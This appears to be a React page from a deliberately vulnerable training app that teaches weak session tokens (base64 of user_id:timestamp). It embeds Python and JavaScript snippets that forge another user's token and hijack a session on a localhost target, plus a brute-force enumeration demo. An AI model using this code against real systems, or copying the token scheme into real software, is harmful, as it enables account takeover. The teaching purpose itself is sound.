import React, { useState } from 'react';
import axios from 'axios';

function Session() {
  const [tokenData, setTokenData] = useState(null);
  const [userId, setUserId] = useState('');
  const [generatedTokens, setGeneratedTokens] = useState([]);

  const generateToken = async () => {
    const response = await axios.get('/api/session', { 
      params: { user_id: userId || undefined }
    });
    setTokenData(response.data);
    
    // Add to generated tokens list
    setGeneratedTokens(prev => [{
      id: Date.now(),
      token: response.data.session_token,
      decoded: response.data.token_decoded,
      timestamp: new Date().toLocaleTimeString()
    }, ...prev].slice(0, 10));
  };

  const bruteForceDemo = async () => {
    setGeneratedTokens([]);
    for (let i = 1; i <= 5; i++) {
      setTimeout(async () => {
        const response = await axios.get('/api/session', { params: { user_id: i } });
        setGeneratedTokens(prev => [{
          id: Date.now(),
          token: response.data.session_token,
          decoded: response.data.token_decoded,
          timestamp: new Date().toLocaleTimeString()
        }, ...prev]);
      }, i * 500);
    }
  };

  return (
    <div className="session-container">
      <div className="page-header">
        <div>
          <h2>🔐 Session Management</h2>
          <p>Understanding session token vulnerabilities</p>
        </div>
        <div className="vuln-badge high">⚠️ WEAK SESSION TOKENS</div>
      </div>

      <div className="warning-box high">
        <strong>⚠️ SECURITY WARNING</strong>
        <p>Session tokens are generated using weak base64 encoding and are easily predictable!</p>
      </div>

      <div className="session-grid">
        <div className="token-generator">
          <h3>🎯 Token Generator (Vulnerable)</h3>
          <div className="generator-controls">
            <input
              type="number"
              value={userId}
              onChange={(e) => setUserId(e.target.value)}
              placeholder="User ID (1-5)"
              className="user-id-input"
            />
            <button onClick={generateToken} className="generate-btn">
              Generate Token
            </button>
            <button onClick={bruteForceDemo} className="brute-btn">
              🔓 Brute Force Demo (1-5)
            </button>
          </div>

          {tokenData && (
            <div className="token-display">
              <div className="token-header">Generated Token</div>
              <div className="token-value">{tokenData.session_token}</div>
              <div className="token-info">
                <div><strong>Format:</strong> {tokenData.token_format}</div>
                <div><strong>Decoded:</strong> <code>{tokenData.token_decoded}</code></div>
                <div><strong>Timestamp:</strong> {tokenData.timestamp}</div>
                <div><strong>Current User:</strong> {tokenData.current_user?.username || 'Unknown'}</div>
              </div>
            </div>
          )}
        </div>

        <div className="exploit-guide">
          <h3>🔓 How to Exploit Weak Tokens</h3>
          <div className="code-example">
            <h4>Python Exploit Code:</h4>
            <pre>{`
import base64
import requests

# Decode the token
token = "${tokenData?.session_token || 'dXNlcjoxOjE3ODAyMzA2MDYxMjQ='}"
decoded = base64.b64decode(token).decode()
print(f"Decoded: {decoded}")

# Modify user_id
user_id = "2"
new_token = base64.b64encode(f"{user_id}:{decoded.split(':')[1]}".encode()).decode()
print(f"New Token for user 2: {new_token}")

# Hijack session
response = requests.get(f"http://localhost:5002/api/session?session={new_token}")
print(f"Session hijacked: {response.json()}")
            `}</pre>
          </div>
          
          <div className="code-example">
            <h4>JavaScript Exploit:</h4>
            <pre>{`
// Decode token
const token = "${tokenData?.session_token || 'dXNlcjoxOjE3ODAyMzA2MDYxMjQ='}";
const decoded = atob(token);
console.log("Decoded:", decoded);

// Modify user_id
const userId = "2";
const timestamp = decoded.split(':')[1];
const newToken = btoa(\`$\{userId}:$\{timestamp}\`);
console.log("New Token:", newToken);
            `}</pre>
          </div>
        </div>
      </div>

      {generatedTokens.length > 0 && (
        <div className="generated-tokens">
          <h3>📋 Recently Generated Tokens</h3>
          <div className="tokens-list">
            {generatedTokens.map((t) => (
              <div key={t.id} className="token-item">
                <div className="token-time">{t.timestamp}</div>
                <div className="token-code">
                  <code>{t.token}</code>
                  <span className="token-decode">→ {t.decoded}</span>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      <div className="info-box">
        <h4>💡 Why Are These Tokens Weak?</h4>
        <p>1. <strong>Predictable Pattern:</strong> Format is always <code>base64(user_id:timestamp)</code></p>
        <p>2. <strong>No Secret Key:</strong> Tokens don't use HMAC or encryption</p>
        <p>3. <strong>Easily Decodable:</strong> Anyone can decode base64</p>
        <p>4. <strong>Modifiable:</strong> Attacker can change user_id and re-encode</p>
        <p>5. <strong>Brute Force Possible:</strong> Try user_id values 1-100 to find valid sessions</p>
      </div>
    </div>
  );
}

export default Session;
